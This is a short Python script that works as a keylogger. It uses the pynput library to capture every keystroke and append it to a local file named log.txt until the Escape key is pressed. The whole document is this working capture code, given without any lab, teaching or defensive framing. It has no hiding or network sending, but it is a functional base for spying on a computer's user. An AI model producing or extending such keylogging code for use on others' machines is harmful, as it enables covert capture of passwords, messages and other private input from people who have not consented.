import pynput.keyboard

# Function to write the pressed key to the log file
def write_to_file(key):
    key = str(key)
    with open("log.txt", "a") as f:
        f.write(key)

# Function to handle when a key is pressed
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(key)

# Function to handle when a key is released
def on_release(key):
    if key == pynput.keyboard.Key.esc:  # Stop listener if the escape key is pressed
        return False

# Set up listener for key presses and releases
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

